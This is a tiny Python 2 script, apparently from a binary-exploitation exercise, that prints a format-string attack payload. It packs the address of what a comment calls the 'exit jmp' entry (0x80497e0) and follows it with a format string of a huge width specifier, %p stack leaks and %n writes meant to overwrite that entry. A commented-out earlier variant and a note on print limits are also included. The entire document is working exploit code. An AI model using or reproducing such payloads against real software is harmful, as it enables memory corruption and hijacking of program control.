import struct
#padding = "%.42BCCCCDDDDEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN %p %p %p %p %p %p %p %p %n"
padding =  "%.1000000000dEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN %p %p %p %p %p %p %p %p %n %p %p"
# #exit jmp : 0x80497e0
addr = struct.pack("I", 0x80497e0)     

print addr + padding

# max we can print is around 860 million